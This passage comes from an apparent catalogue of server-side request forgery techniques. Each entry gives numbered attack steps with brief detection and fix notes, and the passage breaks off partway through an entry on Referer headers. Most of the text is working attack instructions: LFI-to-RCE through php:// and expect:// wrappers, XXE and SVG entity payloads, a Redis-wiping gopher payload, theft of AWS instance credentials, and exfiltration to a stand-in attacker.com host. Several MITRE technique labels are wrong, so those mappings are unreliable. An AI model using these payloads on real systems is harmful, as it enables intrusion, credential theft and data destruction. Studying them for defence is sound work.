- **Attack Steps**: Step 1: Find an SSRF or file-fetching endpoint. Step 2: Instead of using a standard URL, send something like php://filter/convert.base64-encode/resource=/etc/passwd. Step 3: This makes PHP read /etc/passwd, base64-encode it, and output the result. Decode it locally to view the original file. Step 4: This technique is very useful in apps that block file:// but allow relative paths or default streams. Step 5: Also test php://input or php://temp if app reads user-provided POST body or temporary content. Step 6: For example, upload a PHP payload via POST and reference php://input to execute it. Step 7: This may be used in LFI + RCE chains or as a way to leak source code of PHP files. Step 8: If errors are returned, try wrapping with base64 or bypass filters using case variants.
- **Detection**: Log and restrict non-http protocols; detect use of php://, filter:// in parameters
- **Solution**: Disallow PHP wrappers in fetch requests; never allow dynamic input to be passed directly to include/open functions
- **Tags**: PHP Wrappers, Base64 Leak, Filter Chain

## SSRF via LFI + Wrapper (expect://)

- **Attack Type**: Local File Inclusion + Remote Code Execution via expect://
- **Target**: PHP apps using dynamic includes
- **Vulnerability**: LFI with wrapper abuse (command execution)
- **MITRE**: T1059 – Command Execution
- **Impact**: Full Remote Code Execution (via LFI)
- **Tools**: Burp Suite, PHP interpreter
- **Scenario**: Uses expect:// wrapper to execute commands when passed through vulnerable file-handling functions (like include(), fopen(), or SSRF + LFI combos).
- **Attack Steps**: Step 1: Find an LFI (Local File Inclusion) or SSRF input that results in files being included or read on the server. Step 2: Test standard LFI like ?page=../../../../etc/passwd to confirm vulnerability. Step 3: Now, submit ?page=expect://id instead. This may execute the id command on the server if expect:// is enabled in the backend PHP configuration. Step 4: If you receive a response like uid=33(www-data) gid=33(www-data) → command executed. Step 5: Try more complex commands like ls, whoami, or reverse shell payloads. Step 6: This attack works only if the backend uses vulnerable include() or require() on unsanitized user input. Step 7: You can chain this with upload-based LFI or template injection to trigger reliable RCE. Step 8: If disabled by default, expect wrapper may still be enabled in legacy apps or custom builds.
- **Detection**: Log file reads from unexpected wrappers; audit for expect:// usage
- **Solution**: Disable PHP wrappers like expect://; sanitize all file include paths; restrict dynamic includes
- **Tags**: LFI to RCE, PHP Wrapper, expect:// Exploit

## SSRF Chaining: Redirect → Internal Host

- **Attack Type**: SSRF Chained with Redirect to Access Internal Hosts
- **Target**: Frontend fetchers + redirect handlers
- **Vulnerability**: Misconfigured redirect + SSRF filter bypass
- **MITRE**: T1595 – Active Scanning
- **Impact**: Internal panel access, cloud token theft
- **Tools**: Burp Suite, Interactsh, HTTP client
- **Scenario**: Bypass SSRF protections by chaining through open redirect endpoints to reach internal services, even when direct access is blocked by filters or firewall.
- **Attack Steps**: Step 1: Identify two things: (A) an open redirect endpoint (e.g., /redirect?url=...) and (B) a SSRF-vulnerable input (e.g., /fetch?url=...). Step 2: Craft a payload that calls the SSRF endpoint with a redirect URL: /fetch?url=https://site.com/redirect?url=http://127.0.0.1:8000/admin. Step 3: The frontend fetches the redirect → gets routed to 127.0.0.1:8000/admin → internal request succeeds. Step 4: You bypassed SSRF protections by “hiding” the internal IP behind a public URL. Step 5: This chaining trick works well against IP filters that block 127.0.0.1, 169.254.169.254, etc. Step 6: Also try double redirects or delayed JavaScript redirects to trick SSRF filters. Step 7: You can also use encoded IPs (like 0x7f000001) or use DNS tricks (internal@attacker.com) to further chain SSRF payloads. Step 8: This is one of the most common SSRF bypass techniques in real-world bug bounties.
- **Detection**: Monitor chained redirects leading to private/internal addresses
- **Solution**: Enforce redirect target validation; block redirects to internal IP ranges; use SSRF allowlist logic
- **Tags**: SSRF Chaining, Redirect Bypass, Internal Access

## SSRF via DNS Rebinding

- **Attack Type**: SSRF Bypass via Dynamic DNS Resolution
- **Target**: SSRF filters using IP whitelist
- **Vulnerability**: DNS re-resolution leads to internal access
- **MITRE**: T1590 – Gather Victim Network Info
- **Impact**: Full internal resource access, metadata theft
- **Tools**: DNS server (e.g., rebinder), Burp, Interactsh
- **Scenario**: Attacker registers a DNS domain that resolves to a public IP first (passes validation) and then changes to an internal IP after validation for SSRF access.
- **Attack Steps**: Step 1: Register a domain you control (e.g., ssrf.attacker.com) and set it up to resolve to your public IP on first request. Step 2: Setup your DNS server to perform DNS rebinding — meaning: after the first request, it resolves to an internal IP like 127.0.0.1 or 169.254.169.254. Step 3: Find a SSRF parameter (e.g., /fetch?url=) that checks the resolved IP on initial request. Step 4: Submit: /fetch?url=http://ssrf.attacker.com/secret. Step 5: On DNS validation, it points to your public IP, so the app thinks it’s safe. But by the time the backend makes the actual request, the DNS server resolves ssrf.attacker.com to 127.0.0.1. Step 6: The server fetches internal content thinking it’s external. Step 7: Capture leaked data, cloud metadata, or internal dashboards. Step 8: You may use tools like Rebinder or set TTL=0 to trigger rebinding fast.
- **Detection**: Log and resolve SSRF target domains multiple times; alert on DNS switches
- **Solution**: Avoid relying on DNS IP validation; resolve and connect immediately or verify post-resolution IPs
- **Tags**: SSRF, DNS Rebinding, Metadata Exploit

## SSRF Bypassing URL Validation with Redirect

- **Attack Type**: SSRF Redirect Validation Bypass
- **Target**: URL filters or SSRF with redirect logic
- **Vulnerability**: URL allowlist bypass via redirect
- **MITRE**: T1071.001 – Web Protocols
- **Impact**: Bypass SSRF validation, reach internal URLs
- **Tools**: Burp Suite, curl
- **Scenario**: Attacker tricks the app into redirecting from a valid external domain to an internal IP, bypassing SSRF URL validation logic.
- **Attack Steps**: Step 1: Find a SSRF feature that fetches URLs (e.g., /proxy?url=) and has a domain whitelist (e.g., only fetches example.com). Step 2: Register a domain like yourdomain.com that responds with a 302 Redirect to http://127.0.0.1:80/admin. Step 3: Provide URL input: /proxy?url=http://yourdomain.com/redirect. Step 4: The app checks yourdomain.com (valid) → allows it. Then fetches it → gets redirected to 127.0.0.1. Step 5: The app follows the redirect and accesses the internal address. Step 6: You now have SSRF even though the URL validation logic was passed. Step 7: Capture cloud metadata or sensitive internal tools (e.g., Grafana, Jenkins, AWS Metadata API). Step 8: Can also chain open redirect of known public sites (like Google or YouTube) to jump to internal systems.
- **Detection**: Detect redirect chains; resolve final URL post-fetch
- **Solution**: Disallow redirects or re-validate final resolved destination after redirection
- **Tags**: SSRF, Redirect Chain, Allowlist Bypass

## SSRF in Image Fetcher Service

- **Attack Type**: SSRF via External Image Download Logic
- **Target**: Image proxy / resizing / preview features
- **Vulnerability**: Trusting unvalidated image source URL
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Internal data access, blind SSRF, sensitive service leak
- **Tools**: Burp Suite, curl, Interactsh
- **Scenario**: An image proxy or image preview service fetches external URLs. Attacker abuses this to make requests to internal services or metadata APIs.
- **Attack Steps**: Step 1: Find a website feature that shows previews or resizes images by fetching from a URL you provide (e.g., /img-proxy?url=http://...). Step 2: Instead of an image link, submit http://169.254.169.254/latest/meta-data/. Step 3: If the backend fetches and shows this content (even as broken image or error), SSRF is confirmed. Step 4: Try internal IPs: 127.0.0.1, localhost, or cloud local IPs. Step 5: If blocked, try using redirect or DNS tricks like http://[::1], http://0x7f000001, or chain with open redirect. Step 6: Fetch internal tools like http://localhost:8000/metrics, /admin, /debug, etc. Step 7: Use Interactsh to detect blind SSRF — even if no response is shown. Step 8: This method is very common on web dashboards, marketing platforms, or e-commerce preview tools.
- **Detection**: Monitor image URL access and look for metadata or internal IPs
- **Solution**: Validate external image URLs strictly; disallow internal IPs and add SSRF filtering logic
- **Tags**: Image SSRF, Cloud Metadata, Preview Exploit

## SSRF in PDF Converter with wkhtmltopdf

- **Attack Type**: SSRF via PDF Generator Rendering External Content
- **Target**: PDF export tools (wkhtmltopdf, puppeteer)
- **Vulnerability**: Lack of network isolation in rendering engine
- **MITRE**: T1133 – External Remote Services
- **Impact**: Metadata leak, internal dashboard access, PDF data exfil
- **Tools**: wkhtmltopdf, curl, Burp Suite
- **Scenario**: PDF rendering engines like wkhtmltopdf or puppeteer are used to render user-submitted URLs. Attacker provides a URL pointing to internal services.
- **Attack Steps**: Step 1: Identify a website feature that creates a PDF from a submitted URL (e.g., /create-pdf?url=http://...). Step 2: Submit a URL that points to internal IPs like http://127.0.0.1/admin or http://169.254.169.254/latest/meta-data/. Step 3: If wkhtmltopdf runs without network filtering, it renders the internal page and includes it in the output PDF. Step 4: Download the generated PDF → view it. If it contains internal service HTML or cloud metadata, SSRF is confirmed. Step 5: Try chaining with redirects or weird encodings like http://0x7f000001. Step 6: For blind SSRF, embed an <img src="http://attacker.com/leak?token=xyz"> inside the internal page and catch the request on your server. Step 7: If response time varies based on port scanning, you can use this to map internal network (timing-based SSRF scan). Step 8: Very common in admin dashboards or "print this page" SaaS tools.
- **Detection**: Log all URL access made during rendering; alert on internal IP or metadata string in PDF
- **Solution**: Isolate rendering engine (sandbox or VM); block internal IP access; use firewall rules on renderer
- **Tags**: SSRF, PDF Generator, wkhtmltopdf, Internal Info Disclosure

## SSRF in Webhook Receiver

- **Attack Type**: SSRF via user-defined webhook targets
- **Target**: Webhooks, automation platforms
- **Vulnerability**: Lack of validation for webhook destination
- **MITRE**: T1071.001 – Web Protocols
- **Impact**: Internal resource exposure, cloud data exfiltration
- **Tools**: Burp Suite, Interactsh, RequestBin
- **Scenario**: Apps that allow setting a webhook destination (e.g., Slack, Zapier) can be abused to call attacker-controlled URLs, internal IPs, or even cloud metadata endpoints.
- **Attack Steps**: Step 1: Find a platform that allows you to set a custom webhook (e.g., on a form submission, alert, or payment event). Step 2: During webhook setup, provide a URL you control (like http://interact.sh). Step 3: After setting up the webhook, trigger the event (e.g., submit form, cause error, or complete payment). Step 4: Confirm that the backend performs an HTTP request to your server (via logs or using RequestBin). Step 5: Now change the webhook URL to an internal one like http://127.0.0.1:80/, http://169.254.169.254/latest/meta-data, or even internal dashboards (e.g., http://localhost:8080/admin). Step 6: Trigger the webhook again. If the response changes or contains internal information → SSRF confirmed. Step 7: Use internal access to exfiltrate data (e.g., send cloud tokens to your server). Step 8: This works even when SSRF filters exist elsewhere in the app.
- **Detection**: Log outgoing webhooks; alert on requests to internal IPs or cloud metadata
- **Solution**: Validate destination URL; block internal IPs; require webhook domain ownership verification
- **Tags**: SSRF, Webhook Abuse, Metadata Exposure

## SSRF via XML Payload in POST Body (Blind)

- **Attack Type**: Blind SSRF via malicious XML in body
- **Target**: XML-parsing endpoints
- **Vulnerability**: XXE (XML External Entity) + SSRF
- **MITRE**: T1609 – Container and Service Discovery
- **Impact**: Metadata exfiltration, internal access (blind)
- **Tools**: Burp Suite, Interactsh, Responder
- **Scenario**: An attacker submits an XML payload with an external entity that forces the backend parser to fetch a remote/internal resource during parsing (no visual output).
- **Attack Steps**: Step 1: Find a POST endpoint that accepts XML (e.g., Content-Type: application/xml). Step 2: Craft an XML payload that uses an external entity: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]><data>&xxe;</data>. Step 3: Submit the XML via POST. Step 4: If the backend parses the XML and tries to fetch the entity, it makes a request to the metadata server. Step 5: To confirm this as blind SSRF, replace the URL with your Interactsh domain. Step 6: Check Interactsh logs for incoming requests → SSRF confirmed. Step 7: This method is blind because you won’t see a response, but can track DNS or HTTP hits. Step 8: Common in APIs using XML parsers (Java, .NET, PHP) with external entity resolution enabled.
- **Detection**: Monitor outbound DNS and HTTP from XML-parsing services; enable parser logging
- **Solution**: Disable external entity parsing in XML parsers; use JSON instead of XML for external input
- **Tags**: XXE, Blind SSRF, XML Payload

## SSRF via SVG or XML External Entities

- **Attack Type**: SSRF via image uploads containing XXE
- **Target**: File parsers or image processors
- **Vulnerability**: External entity parsing in SVG or XML
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: File disclosure, metadata access, internal port probing
- **Tools**: Burp Suite, custom SVG editor, Interactsh
- **Scenario**: Uploading malicious .svg or XML files with embedded entities can trigger SSRF when the server parses or renders them internally.
- **Attack Steps**: Step 1: Look for any feature allowing .svg, .xml, or “vector image” uploads (e.g., profile picture, product catalog). Step 2: Create a malicious .svg file containing a DTD like: <!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><svg>&xxe;</svg>. Step 3: Upload the SVG file. Step 4: If the server attempts to parse the SVG (e.g., for conversion, resizing, or validation), it may fetch the xxe entity from the given URL. Step 5: Try replacing the metadata URL with your Interactsh link to confirm the request. Step 6: If you receive a hit → the SVG was parsed and SSRF occurred. Step 7: Some SVG renderers like ImageMagick or custom SVG2PDF tools are vulnerable. Step 8: This works even if the image is never shown to the user, as parsing happens at upload.
- **Detection**: Inspect SVG/XML parsing logs; monitor network calls triggered by uploads
- **Solution**: Disable DTD processing in XML/SVG parsers; sanitize uploaded images or use sandboxed converters
- **Tags**: SSRF, SVG Upload, XXE

## SSRF via Web Crawlers (Scheduled Tasks)

- **Attack Type**: Delayed SSRF via URL Crawling Engines
- **Target**: Crawlers, SEO tools, preview engines
- **Vulnerability**: Scheduled URL fetching without IP filtering
- **MITRE**: T1595 – Active Scanning
- **Impact**: Scheduled internal resource fetching → data leak
- **Tools**: Burp Suite, Interactsh, HTTP server
- **Scenario**: Apps that crawl user-submitted URLs for preview, analysis, or indexing may be tricked into accessing internal systems on schedule.
- **Attack Steps**: Step 1: Find a service that lets users submit URLs or websites (e.g., marketing tools, social media previewers, blog aggregators, SEO apps). Step 2: Submit a URL pointing to your controlled server (e.g., http://interactsh.com/ping). Step 3: Wait for scheduled crawler to fetch your link (some apps crawl once an hour or day). Step 4: Now change the submitted URL to internal resources, like http://127.0.0.1/admin or http://169.254.169.254/latest/meta-data. Step 5: On next crawl, the backend will fetch internal content and possibly expose it in logs, previews, or side channels. Step 6: Also try embedding <img src="http://attacker.com/leak.png"> in the crawled page → helps with blind SSRF detection. Step 7: This method is slower but highly effective, especially against apps like Zapier, Feed Readers, or Auto Indexers. Step 8: Confirm hits on your server using logs or tools like Interactsh.
- **Detection**: Analyze crawler fetch logs; monitor unexpected outbound requests on schedule
- **Solution**: Validate submitted URLs; restrict crawlers from accessing internal IP ranges; sandbox all fetches from user data
- **Tags**: SSRF, Scheduled Fetch, Web Crawler Abuse

## SSRF to Leak AWS Credentials and Assume Roles

- **Attack Type**: SSRF → Cloud Metadata Theft
- **Target**: Cloud EC2, ECS, Lambda
- **Vulnerability**: SSRF access to AWS Metadata Service
- **MITRE**: T1526 – Cloud Account Discovery
- **Impact**: Full AWS account takeover, credential theft
- **Tools**: Burp Suite, Interactsh, curl, AWS CLI
- **Scenario**: SSRF on a cloud-hosted app (EC2, ECS, Lambda) allows access to AWS Metadata Service at http://169.254.169.254, leaking IAM credentials, tokens, and even temp roles.
- **Attack Steps**: Step 1: Find SSRF using a parameter like /fetch?url= or /proxy?img=.... Confirm basic SSRF using http://interact.sh. Step 2: Change target to internal AWS metadata IP: http://169.254.169.254/latest/meta-data/. You should get back folders like iam/, security-credentials/, instance-id, etc. Step 3: Send SSRF to http://169.254.169.254/latest/meta-data/iam/security-credentials/ to get the IAM role name (e.g., AppInstanceRole). Step 4: Now fetch full credentials via http://169.254.169.254/latest/meta-data/iam/security-credentials/AppInstanceRole. Step 5: Extract AccessKeyId, SecretAccessKey, Token. Step 6: Open AWS CLI or script and configure with these credentials. Run: aws s3 ls --region us-east-1 or aws sts get-caller-identity. Step 7: You now have full AWS access equal to the instance's role (data exfiltration, persistence, EC2/RDS access possible). Step 8: Clean traces and rotate credentials if you’re defending.
- **Detection**: Monitor metadata requests; use VPC endpoint logging; detect CLI usage outside normal locations
- **Solution**: Use IMDSv2 (session tokens), limit instance IAM privileges, block SSRF to 169.254.169.254
- **Tags**: SSRF, AWS IMDS, Cloud Credential Theft

## SSRF to Query Internal REST APIs

- **Attack Type**: SSRF → Internal API Calls
- **Target**: Internal admin/backend APIs
- **Vulnerability**: SSRF without internal endpoint filtering
- **MITRE**: T1592 – Network Recon
- **Impact**: Unauthorized access to private APIs or config endpoints
- **Tools**: Burp Suite, browser, curl, Postman
- **Scenario**: SSRF allows attackers to reach internal-only APIs (e.g., /admin, /debug, /api/v2/config) that are not accessible from external clients.
- **Attack Steps**: Step 1: Locate a vulnerable SSRF parameter, e.g., ?url=.... Confirm with public URL. Step 2: Guess common internal endpoints like http://127.0.0.1:8000/admin, http://localhost:5000/api/v2/debug, http://127.0.0.1:8080/config. Step 3: Trigger SSRF to each guessed endpoint. If response returns internal JSON, error messages, or HTTP 200, access is confirmed. Step 4: Modify query params, e.g., ?url=http://127.0.0.1:5000/config?show=creds to extract sensitive info. Step 5: Try POST requests via SSRF if allowed. SSRF can POST to http://localhost:8080/deleteUser?id=1. Step 6: Map all accessible internal routes using SSRF + wordlists. Step 7: Use what you learn to escalate, trigger backend actions, or get secrets from debug APIs. Step 8: Most SSRF filters don’t block localhost or internal hostnames like http://internal-api/.
- **Detection**: Detect access to privileged API routes from unknown sources or abnormal proxies
- **Solution**: Block SSRF to internal hostnames; require token/auth on all API endpoints even internal ones
- **Tags**: SSRF, Internal API Enumeration, Unauthorized API Access

## SSRF to Enumerate Internal Ports and Services

- **Attack Type**: SSRF as Port Scanner (Timing, Diff, Error-based)
- **Target**: Any SSRF-accessible internal server
- **Vulnerability**: SSRF with unrestricted URL fetch to localhost
- **MITRE**: T1046 – Network Service Scanning
- **Impact**: Port enumeration, lateral movement, pivoting
- **Tools**: curl, Burp Suite, ffuf, custom Python SSRF scanner
- **Scenario**: SSRF can be used to detect open ports internally by analyzing response time, error codes, or content from requests to localhost:1-65535.
- **Attack Steps**: Step 1: You have a confirmed SSRF param (e.g., /img?src=). Build a list of ports (e.g., 21, 22, 80, 443, 3306, 6379, 8000, 9000). Step 2: Send SSRF requests to http://127.0.0.1:<port>/. Step 3: If response is fast and returns HTTP 200 → port likely open. If connection times out → port closed or filtered. Step 4: Use Burp Intruder or ffuf to automate scanning all 65535 ports. Analyze timing or error differences. Step 5: Use crafted payloads like gopher://127.0.0.1:22/ or http://localhost:9200/ to detect SSH, Elasticsearch, etc. Step 6: Log all responses and match to service banners or error pages. Step 7: Now that open services are known, try accessing admin interfaces or triggering other SSRF-based exploits. Step 8: You’ve now built an internal port/service map through blind SSRF.
- **Detection**: Monitor burst SSRF activity; alert on probes to high port ranges or localhost
- **Solution**: Filter SSRF by host and port; enforce allowlist; rate-limit SSRF entry points
- **Tags**: SSRF Port Scanner, Service Discovery, Internal Recon

## SSRF to Exploit MongoDB on 127.0.0.1

- **Attack Type**: SSRF → No-Auth MongoDB Access via HTTP
- **Target**: Internal MongoDB instance
- **Vulnerability**: SSRF into No-Auth MongoDB
- **MITRE**: T1539 – Steal or Modify Application Data
- **Impact**: Data exfiltration, database wipeout, NoSQL injection
- **Tools**: curl, SSRFmap, Burp Suite
- **Scenario**: MongoDB (esp. pre-3.x) may be accessible without auth on localhost:27017. SSRF lets attacker read, write, or drop data via internal access.
- **Attack Steps**: Step 1: Confirm SSRF via ?url=.... Test against http://127.0.0.1:27017/. Step 2: If response includes "It looks like you are trying to access MongoDB" or a JSON document, MongoDB is accessible. Step 3: Access default endpoints like /, /serverStatus, or database names. Try http://127.0.0.1:27017/admin/$cmd/?filter[]=ping. Step 4: SSRFmap or custom gopher payloads can be used to send Mongo wire protocol requests (advanced). Step 5: Use GET/POST-based SSRF to enumerate databases (/listDatabases) or run commands like find(), drop(), or insert. Step 6: Try injecting NoSQL queries via SSRF if possible (e.g., $where, regex, or conditional logic). Step 7: If Mongo is accessible and SSRF supports POST, full DB takeover is possible. Step 8: Works best on old MongoDB exposed to localhost without IP-binding restrictions or auth.
- **Detection**: Monitor MongoDB connections from unusual IPs; alert on 127.0.0.1 SSRF-like traffic
- **Solution**: Restrict MongoDB to bind only to localhost and require authentication
- **Tags**: SSRF MongoDB, NoSQL Injection, Database Exploitation

## SSRF via SSRFmap Gopher Payloads

- **Attack Type**: SSRF Protocol Abuse with Gopher
- **Target**: Any app with SSRF and internal services
- **Vulnerability**: SSRF + gopher:// for raw protocol payloads
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: Remote command execution, data injection, lateral movement
- **Tools**: SSRFmap, Burp Suite, Gopherify, Interactsh
- **Scenario**: The gopher protocol allows raw TCP payload delivery via SSRF. ssrfmap can generate payloads to exploit services like Redis, HTTP, or SMTP through SSRF-enabled parameters.
- **Attack Steps**: Step 1: Identify a URL parameter that is vulnerable to SSRF (e.g., /fetch?url=). Confirm SSRF using Interactsh (http://interactsh.com). Step 2: Install SSRFmap from GitHub: git clone https://github.com/swisskyrepo/SSRFmap.git → install Python dependencies. Step 3: Use SSRFmap to generate Gopher payloads. For example: python ssrfmap.py -p redis -u 'http://victim.com/fetch?url=' → generates payloads to target Redis via gopher. Step 4: SSRFmap crafts a payload like: gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20key%20malicious%0D%0A (this injects Redis commands). Step 5: Paste the full SSRF URL in browser or curl to trigger it. Step 6: If executed, Redis command executes from the vulnerable server. Step 7: You can target HTTP, FTP, SMTP services similarly. Step 8: SSRFmap automates exploitation and payload generation for internal service access via raw TCP — a powerful post-SSRF technique.
- **Detection**: Monitor unusual outbound gopher/TCP activity; log SSRF use
- **Solution**: Block gopher://, ftp://, etc., at SSRF filters; whitelist only http/https in SSRF destinations
- **Tags**: SSRF, SSRFmap, Gopher, Redis Injection

## SSRF to Access ELK Stack Interfaces

- **Attack Type**: SSRF to Internal Logging Dashboards
- **Target**: Internal logging/dashboard interfaces
- **Vulnerability**: SSRF access to local-only admin interfaces
- **MITRE**: T1592 – Gather Infrastructure Info
- **Impact**: Log access, info disclosure, privilege escalation
- **Tools**: Burp Suite, curl, browser, Interactsh
- **Scenario**: Kibana, Elasticsearch, and Logstash often expose dashboards internally. SSRF can be used to query logs, leak data, or gain RCE (via plugin systems).
- **Attack Steps**: Step 1: Identify SSRF in a feature like /fetch?url=. Step 2: Try accessing http://localhost:5601, http://127.0.0.1:9200, or http://127.0.0.1:5044 — these are Kibana, Elasticsearch, and Logstash ports. Step 3: Use SSRF to GET http://127.0.0.1:9200/_cat/indices?v to list indexes. If the SSRF returns JSON, access is confirmed. Step 4: Query sensitive logs via http://127.0.0.1:9200/logstash-*/_search. Step 5: Try POSTs or search filters to access credentials, tokens, or errors stored in logs. Step 6: For Kibana, try SSRF into http://127.0.0.1:5601/app/kibana#/discover → might show dashboard previews. Step 7: If Elasticsearch has scripting enabled, you may inject Groovy expressions to escalate (if permitted). Step 8: Use fuzzing to enumerate accessible ports and expand SSRF scope.
- **Detection**: Monitor SSRF requests to ELK ports; alert on hits to _cat or /_search
- **Solution**: Place ELK stack behind auth/firewall; disallow SSRF to internal ports or 127.0.0.1
- **Tags**: SSRF, ELK Stack, Elasticsearch Kibana Log Access

## SSRF to Exploit Prometheus API

- **Attack Type**: SSRF to Cloud Monitoring API
- **Target**: Monitoring systems, DevOps dashboards
- **Vulnerability**: SSRF to /query, /metrics, /config APIs
- **MITRE**: T1596 – Internal Recon via Services
- **Impact**: Monitoring takeover, data leak, lateral access
- **Tools**: curl, browser, SSRF URL builder, Burp
- **Scenario**: Prometheus API exposes query endpoints like /api/v1/query, /config, and metrics, often without authentication inside cloud networks.
- **Attack Steps**: Step 1: Using a working SSRF (e.g., /render?url=), target Prometheus by requesting http://localhost:9090/api/v1/query?query=up. Step 2: If Prometheus is exposed internally, SSRF response will include JSON metrics showing which services are online. Step 3: Access http://localhost:9090/config to dump Prometheus’ YAML config (may contain credentials or alert rules). Step 4: Try SSRF to http://localhost:9090/metrics to enumerate services and target other SSRF hops. Step 5: Inject alerting rules via misconfigured APIs (older versions) or explore scrape targets. Step 6: Blind SSRF? Use http://attacker.com/leak.png in alerting or Prometheus rules to leak data. Step 7: SSRF into Prometheus opens up monitoring view of the entire infrastructure.
- **Detection**: Log Prometheus API requests; watch unexpected queries or endpoints
- **Solution**: Disable public access to Prometheus; block SSRF to localhost:9090; add auth to /api/*
- **Tags**: SSRF, Prometheus, Metrics Enumeration

## SSRF via Misconfigured SSRF Proxy

- **Attack Type**: SSRF Abuse through Open Proxy Component
- **Target**: Apps with internal fetch/proxy logic
- **Vulnerability**: Unrestricted proxy endpoint used as SSRF relay
- **MITRE**: T1210 – Exploitation of Remote Services
- **Impact**: SSRF chaining, internal resource access, cloud takeover
- **Tools**: Burp Suite, browser, curl, Interactsh
- **Scenario**: Some applications use SSRF proxies to safely fetch content. If not restricted, these proxy endpoints can be abused to bypass filters and launch internal SSRF.
- **Attack Steps**: Step 1: Identify SSRF proxy endpoints like /proxy?target=https://site.com, /fetch, or /image?url=.... These act as middlemen fetching remote URLs. Step 2: Try replacing the value with internal URLs like http://localhost:80, http://169.254.169.254, or http://127.0.0.1:27017. Step 3: If response differs (e.g., errors, timeouts, or success), the proxy is vulnerable. Step 4: Now use the proxy to fetch forbidden URLs by encoding them in target or url parameter. Example: /proxy?target=http://internal-service/admin. Step 5: If successful, the app will return internal content not visible externally. Step 6: Use this to fetch metadata, hit admin panels, or exfiltrate via gopher/file/http. Step 7: Chain with SSRFmap or gopherify to escalate. Step 8: Now attacker can use app as a tunnel into the internal network.
- **Detection**: Monitor proxy usage and external URLs; detect 127.0.0.1, localhost, or metadata IPs used in parameters
- **Solution**: Enforce allowlist on proxy targets; deny internal IP ranges like 127.0.0.1, 169.254.169.254, 10.0.0.0/8, etc.
- **Tags**: SSRF Proxy, Open Redirect, Metadata Theft

## SSRF via SVG Image Embedded in PDF

- **Attack Type**: SSRF Triggered via PDF Generation with SVG Reference
- **Target**: PDF generation backends
- **Vulnerability**: SSRF via embedded SVG inside document rendering
- **MITRE**: T1059 – Command/Content Execution
- **Impact**: SSRF-triggered metadata leaks or internal scanning
- **Tools**: wkhtmltopdf, Burp Suite, SVG template, Interactsh
- **Scenario**: Some apps convert user-uploaded HTML/SVG to PDF (e.g., using wkhtmltopdf). Malicious SVG can embed external URLs that trigger SSRF from the server generating PDF.
- **Attack Steps**: Step 1: Create an SVG file (malicious.svg) containing a <image> tag that fetches from internal services. Example: <image href="http://169.254.169.254/latest/meta-data/" height="0" width="0"/>. Step 2: Upload this SVG into an app feature that converts files to PDF (e.g., invoice generator, report preview). Step 3: If backend uses wkhtmltopdf, it renders the SVG and triggers the internal HTTP request. Step 4: Use Interactsh or a controlled server to monitor requests or errors. Step 5: If internal resources like metadata IP or internal admin URL are accessed, SSRF works. Step 6: You can modify the SVG to hit different ports, REST APIs, or use file:// for local file access. Step 7: May also embed <script> for XXE in SVG if parser is weak. Step 8: Works in any SSRF-vulnerable PDF generation feature using unfiltered SVG/HTML.
- **Detection**: Monitor outgoing requests from PDF engine; detect excessive PDF/SVG rendering anomalies
- **Solution**: Disable external network access in wkhtmltopdf or similar engines; sanitize all input to PDF generator
- **Tags**: SSRF, SVG Payload, PDF Generator, Metadata Access

## SSRF via Cloud Function HTTP Triggers

- **Attack Type**: SSRF via User-Controlled Cloud HTTP Trigger
- **Target**: Cloud Functions (AWS, GCP, Azure)
- **Vulnerability**: SSRF via exposed HTTP fetch in serverless env
- **MITRE**: T1526 – Cloud Account Discovery
- **Impact**: Cloud metadata theft, VPC scanning, SSRF chaining
- **Tools**: AWS CLI, Burp Suite, curl, Postman
- **Scenario**: Cloud functions (AWS Lambda, Azure Functions, GCP Cloud Functions) triggered via HTTP can be misused as SSRF relays if not properly filtered or isolated.
- **Attack Steps**: Step 1: Find a cloud function HTTP trigger (e.g., https://region-project.cloudfunctions.net/getData?url=...). Step 2: Try injecting internal URL like http://127.0.0.1:80 or http://metadata.google.internal/computeMetadata/v1/. Step 3: If metadata or error content is returned, SSRF is working. Step 4: Use this endpoint to query localhost, internal APIs, or fetch cloud instance metadata. For GCP, target http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true. Step 5: For AWS, target http://169.254.169.254/latest/meta-data/. Step 6: If token-based metadata, set Metadata-Flavor: Google or use IMDSv2 headers. Step 7: You now have a serverless SSRF tunnel, usable from anywhere if exposed. Step 8: Use SSRFmap or chain to access DBs, Redis, or other VPC services.
- **Detection**: Monitor HTTP trigger usage; alert on 127.0.0.1 or cloud metadata IP access
- **Solution**: Limit HTTP fetch to known domains; reject localhost or internal metadata IPs
- **Tags**: SSRF, Cloud Function Abuse, Metadata Enumeration

## SSRF via Email Tracking Pixel Fetch

- **Attack Type**: SSRF via Backend Image Rendering in Emails
- **Target**: Email renderers (HTML)
- **Vulnerability**: SSRF triggered via email template fetch
- **MITRE**: T1585 – Data from Email Component
- **Impact**: Metadata theft, internal recon, pixel tracking SSRF
- **Tools**: Email client, SMTP tester, Interactsh
- **Scenario**: Some email systems fetch embedded images (tracking pixels) server-side to verify validity. This can be abused for SSRF if URLs are attacker-controlled.
- **Attack Steps**: Step 1: Identify a feature where the app sends emails to users with previews (e.g., welcome emails, receipts, alerts). Step 2: Embed a remote image tag in an HTML input field, like <img src="http://169.254.169.254/latest/meta-data/" width="1" height="1"/>. Step 3: Submit the input so that the backend stores and sends the image tag in email body. Step 4: Wait for the system to send email → backend renders the email → triggers image fetch from the attacker-controlled URL. Step 5: You may also try internal URLs like http://127.0.0.1:9200/_cat/indices or Redis endpoints. Step 6: Use Interactsh to confirm request if blind. Step 7: If working, you now have SSRF via email engine — useful for hitting internal web panels or metadata services. Step 8: Works best on auto-previewing email systems using server-side renderers (Node.js, Java, PHP-based).
- **Detection**: Monitor server-side HTTP fetch logs for email image loads to unusual IPs
- **Solution**: Sanitize user content in emails; disable auto-fetch of untrusted images on server rendering engines
- **Tags**: SSRF, Email Render Abuse, Tracking Pixel Payloads

## SSRF via Referer Header Injection

- **Attack Type**: SSRF using Unvalidated HTTP Referer Header
- **Target**: Backend services using headers
- **Vulnerability**: Unvalidated Referer used for HTTP requests
- **MITRE**: T1190 – Exploit Public-Facing App
- **Impact**: Internal data exposure, cloud takeover, dashboard access
- **Tools**: Burp Suite, curl, browser dev tools
- **Scenario**: Backend services that fetch or validate resources based on the Referer header can be manipulated to trigger internal HTTP requests.
